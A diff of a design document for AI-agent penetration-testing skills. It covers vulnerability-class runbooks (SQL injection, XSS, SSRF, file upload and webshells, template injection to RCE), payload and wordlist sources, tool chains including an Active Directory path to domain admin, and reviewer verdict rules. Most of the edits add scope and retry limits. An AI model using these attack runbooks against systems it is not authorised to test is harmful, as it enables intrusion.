+[Claude Code subagents](https://code.claude.com/docs/en/sub-agents) describe discovery/permission
+features; local resolved tools and actual named startup calls, not examples alone, decide support.
+
 ---
 
 ## 6. Vuln-category skills — "cut it down"
@@ -485,8 +535,8 @@ precisely and loads a focused runbook; a broad one matches everything and helps 
 |---|---|---|
 | `sqlmap` | SQL injection, union/blind/error | detection flow → manual payloads → sqlmap tuning → extraction minimisation |
 | `xss` | reflected/stored/DOM XSS, dalfox | context analysis → payloads per sink → confirm → impact PoC |
-| `ssrf` | server-side request forgery, metadata/169.254 | parameter ID → internal targets → filter bypass → impact |
-| `idor` / `bola` | broken object/access control | enumerate IDs → swap/escalate → authz matrix |
+| `ssrf` | server-side request forgery | <=3 fetch candidates, checked controlled destination, minimum correlated proof; no default metadata sweep |
+| `idor` / `bola` | broken object/access control | <=3 controlled A/B object/action pairs, ownership comparison and authz matrix |
 | `lfi-rfi` | file inclusion, path traversal, php wrappers | payload ladder → wrappers/log poisoning → RCE path |
 | `file-upload` | upload bypass, webshell | extension/content-type/magic bypass → execution |
 | `ssti` | template injection | detect polyglot → identify engine → sandbox escape → RCE |
@@ -496,8 +546,8 @@ precisely and loads a focused runbook; a broad one matches everything and helps 
 
 **Rules for vuln-category skills**
 - **One class per skill.** If a body grows a second "## Also check…" class, split it.
-- **The body is a *testing methodology*, not a tool wrapper** — it names which tool skills to invoke
-  (`ffuf`, `sqlmap`, `dalfox`) at each step.
+- **The body is a focused testing methodology** with selected cases and proof/stop criteria. Name
+  proposed other skills in the handback; workers never invoke or chain skills themselves.
 - **Lean on RAG hard here:** point each at the relevant **PayloadsAllTheThings** folder +
   **HackTricks** page so payload libraries live in the RAG store, not hardcoded in the body.
 - **`effort` follows §4** (web class = medium); the bypass-heavy reasoning stays in the methodology.
@@ -513,7 +563,8 @@ content. Set these up once and have skills reference them.
 - `SecLists` — the canonical wordlist collection. Pin a path; let `ffuf`/`feroxbuster`/`gobuster`
   reference it.
 - `PayloadsAllTheThings` — payloads per vuln class. Ideal RAG source for the §6 skills.
-- `rockyou.txt` + rules (`best64`, `OneRuleToRuleThemAll`) for cracking skills.
+- Reviewed cracking dictionaries/rules as optional sources; select a finite contextual subset/pattern,
+  not automatic `rockyou.txt`/rules ladders.
 
 **RAG stores that give real uplift (index these):**
 - **HackTricks** — methodology per service/OS/privesc/AD. Broadly useful.
@@ -523,18 +574,21 @@ content. Set these up once and have skills reference them.
 - **Hash-mode tables / cipher references** — cracking & crypto.
 - Per-engagement notes (scope, prior findings) — a small per-target store the agent reads first.
 
-**Canonical chaining (encode as cross-skill references in bodies):**
+**Conditional handoffs (examples, not compulsory chains):**
 ```
-subfinder → dnsx → httpx → katana → nuclei → [manual: burpsuite] → vuln-category skills → report
-port-scanner → (per-service) enum4linux-ng / smbmap / web skills → exploitation → linpeas → loot
-AD: netexec → bloodhound → impacket/certipy/kerberoast → hashcat → netexec (as new user) → DA
+Known internal IP -> selected common TCP ports -> a discovered service hypothesis
+Known web endpoint -> baseline/page evidence -> one relevant template or manual case
+Known AD identity/rights -> one directory or protocol hypothesis -> minimal verified impact
+Known artifact -> cheap format/logic triage -> one evidence-led extraction/solve task
 ```
+Skip irrelevant stages. The coordinator chooses after reviewed handback and tracks goal/omissions;
+a new identity/unchanged endpoint is not permission to repeat the same scans as fresh evidence.
 
 ---
 
 ## 8. The `## Checklist` block (verification layer 1)
 
-Every skill carries a `## Checklist` — a fenced YAML block the `review` skill parses deterministically.
+Every skill carries a `## Checklist` — a fenced YAML block the independent reviewer reads and checks.
 It declares each required part *and how to verify it from evidence*. (Example in
 `templates/SKILL.template.md`.)
 
@@ -554,35 +608,36 @@ checklist:
     required: true
 ```
 
-**`verify` methods** (reviewer runs these read-only against evidence):
+**`verify` methods** (reviewer assesses these read-only, without shell execution):
 
 | method | passes when | use for |
 |---|---|---|
-| `exists` | path exists | a file/dir was produced |
+| `exists` | path exists | bookkeeping only, not proof of execution/impact |
 | `nonempty` | exists **and** has content | output that must not be empty |
 | `contains:<regex>` | file matches the regex | proof of *real* results (e.g. `open`, `\[critical\]`) |
-| `min-lines:<n>` | file has ≥ n lines | lists (subdomains, live hosts) |
-| `exit-zero` | the step's recorded exit code is 0 | tool must have run cleanly |
+| `min-lines:<n>` | file has ≥ n lines | required nonempty data only, not legitimate empty discovery |
+| `exit-zero` | actual tool exit is 0 and no helper failure | strict clean execution; classified nonzero needs judge |
 | `judge` | reviewer reads evidence and assesses vs `desc` | things no pattern captures (scope, triage quality) |
 
 **`on_fail` actions:**
 
 | action | meaning |
 |---|---|
-| `redo-part` | re-run only the step(s) that produce this evidence, then re-verify |
-| `redo-skill` | failure implies bad inputs/early breakage — re-run the whole skill |
-| `fail` | **do not retry** — stop and escalate to the user (scope gates, destructive, ambiguous) |
+| `redo-part` | recommend an exact permitted local documentation/compilation repair to coordinator |
+| `redo-skill` | recommend reassessment/new bounded task; never automatic active replay |
+| `fail` | fail review; no retry for scope, hard errors, false proof or unsafe/ambiguous actions |
 
 **`required`**: `true` items block a PASS; `false` items are reported but don't fail the review.
 
 **Authoring rules**
-- Every item points at **evidence the step actually writes.** If a step can produce nothing checkable,
-  make it write a marker file (e.g. `echo "no findings" > nuclei.txt`) so "ran but found nothing" ≠
-  "didn't run".
+- Every item points at actual evidence; command events/native output/real GUI exports prove work,
+  not generated findings.md, marker-only narratives or precreated collection/project/loot directories.
+  Keep empty native lists/JSON unchanged; separate analysis records scoped negatives/omissions.
 - The **scope gate is always `on_fail: fail`** and references inherited `../../scope.json` — never
   retry your way past an unconfirmed target, and never re-confirm scope per run.
-- Prefer `contains:`/`min-lines:` over bare `exists` so an empty/garbage file doesn't pass.
-- Keep it to the parts that matter — 4–8 items per skill is typical.
+- Prefer judge plus real data/paired events for execution/coverage/triage. Positive proof is conditional
+  on a positive claim: absent optional proof is not an order to rerun an exploit or collect a flag.
+- Keep it to meaningful selected-task items (typically 3–5), with honest partial and no-hit outcomes.
 
 > The run record the helper writes (`run.json`) and its schema, the error-handback
 > `findings.md` shape, and the timestamp/self-report/cleanup invariants the reviewer also checks all
@@ -593,14 +648,15 @@ checklist:
 ## 9. The `review` skill & verdicts (verification layer 2)
 
 The `review` skill (`.claude/skills/review/SKILL.md`, category `meta`) is an independent completion
-check. It never trusts "I did it"; it verifies against artifacts on disk — ideally forked into a fresh
-agent that didn't produce the work.
+check against the declared bounded profile, not exhaustive coverage. It runs in the exact locked
+reviewer context, including standalone invocation; it never starts a helper/shell/nested review run.
 
 **Flow:** load the task skill's `## Checklist` → load `run.json` for context (a parseable `run.json`
 is mandatory on any terminal run; missing/unparseable → FAIL) → **re-verify every item independently**
 (don't trust `run.json` item `ok`) → check the cross-cutting invariants from `AGENTS.md` (timestamp
-sanity, self-report consistency, cross-run contamination, cleanup state) → decide → remediate within
-bounded retries through an authorized executor → write `<run_dir>/review.json` via Write.
+sanity, native coverage/outcomes, consistency, provenance, conditional finding proof, cleanup state)
+-> decide -> request only permitted coordinator repairs -> write assigned review.json via Write with
+an actual coordinator-supplied UTC review time. Initial read budget is 120 seconds.
 
 **Decision logic (summary).** Let `F` = required items that failed.
 - Missing/unparseable `run.json`, a guardrail-bypass attempt, or any cross-cutting invariant violation
@@ -608,32 +664,38 @@ bounded retries through an authorized executor → write `<run_dir>/review.json`
 - `F` empty and invariants hold → **PASS.**
 - Any `F` item is `on_fail: fail`, or a hard tool error occurred, -> FAIL. The respected-guardrail
   compliance exception follows AGENTS.md; it is not proof of a completed action or finding.
-- Else isolated evidence-producing failures within budget → **REDO-PART**; else within skill budget →
-  **REDO-SKILL**; else retries exhausted → **FAIL.**
+- Truthful scoped-negative/terminal partial/native-budget and unclaimed missing goal proof do not
+  require replay for PASS. Task compliance, coverage and engagement goal are separate judgments.
+- A recoverable local documentation/compilation gap is FAILED with an exact coordinator action,
+  not PASS based on a recommendation. Actual independently checked repair can be FAILED-RECOVERED.
 
-**Remediation guardrails:** never retry an `on_fail: fail` item; never repeat a destructive/irreversible
-action on retry (exploit firing, data modification, lockout-risk spraying) — FAIL and ask instead;
-bounded by `max_part_retries` / `max_skill_retries`; a redo targets only the specific failed items.
+Reviewers never replay tests/contact targets. Scope/guardrail/transport/actionful/lockout-sensitive
+failures are not review-driven retries; missing positives or coverage do not justify broader scanning.
 
 **Verdicts the user sees:**
 
 | Verdict | Meaning | What happens |
 |---|---|---|
 | `PASS` | Required work or stop compliance independently verified | `review.json` written; do not infer unperformed work |
-| `FAILED-RECOVERED` | Some items failed but a bounded redo fixed them | report notes the redo; proceed |
-| `FAILED` | Unrecoverable or retries exhausted | user told which parts, what was tried, the cause, the decision needed |
+| `FAILED-RECOVERED` | Actual permitted local recovery independently verified | disclose repair; only proved findings eligible |
+| `FAILED` | Required item/invariant unresolved | state exact missing work, cause and permitted coordinator action |
 | `NON-COMPLIANT` | Target skill has no `## Checklist` | can't be verified → treated as fail; add a checklist |
 
-Only `PASS` / `FAILED-RECOVERED` runs are eligible for the final report.
+Only individually evidence-backed findings with PASS/FAILED-RECOVERED reviews are eligible; terminal
+partial can support verified findings but no exhaustive negative. Hard-error/unfinished/unreviewed/
+legacy runs stay excluded, and a guardrail compliance PASS is never a finding.
 
 **Worked examples**
-- *Recoverable miss (`port-scanner`):* the detail scan file is empty → `service-detail`
-  (`contains:open`) FAILs with `on_fail: redo-part`, retries available → re-run the version-scan step
-  only → re-verify → now matches `open` → **FAILED-RECOVERED**.
-- *"No findings" vs "didn't run" (`nuclei`):* if `nuclei.txt` is missing, `scan-ran` (`redo-skill`)
-  fires — the scan never happened. If it says "no findings", `exists` **passes** (it ran, found
-  nothing) — which is why the body must write that marker. Missing triage in `findings.md` →
-  `on_fail: fail` → **FAILED** (the reviewer won't fake analyst judgement).
+- *Bounded ports:* completed top-100 XML and derived empty inventory can PASS for that profile;
+  unselected TCP/UDP stay omitted. No fabricated detail file or forced full-port scan.
+- *Native FFUF budget:* terminal partial with actual events/native JSON, counts and omitted entries
+  can PASS compliance without replay. A default-page/403 match is not a verified vulnerability.
+- *Empty Nuclei JSONL:* actual normally ended selected-template events plus triage/coverage can PASS;
+  an empty file/marker without events cannot. A hard helper deadline stays error despite flushed output.
+- *Collection/logic:* precreated directories without objects/import/query or actual analysis logs
+  cannot prove BloodHound/Ghidra work. Honest missing capability remains a goal/coverage limitation.
+- *Report repair:* allowed local HTML/markdown mismatch repaired and independently checked can be
+  FAILED-RECOVERED; no need or permission to replay a target action.
 - *Hard failure (fail fast):* `run.json.status == error`, `errors: ["subfinder: command not found"]`
   → skip all retries → **FAILED**, tell the user to install the tool.
 
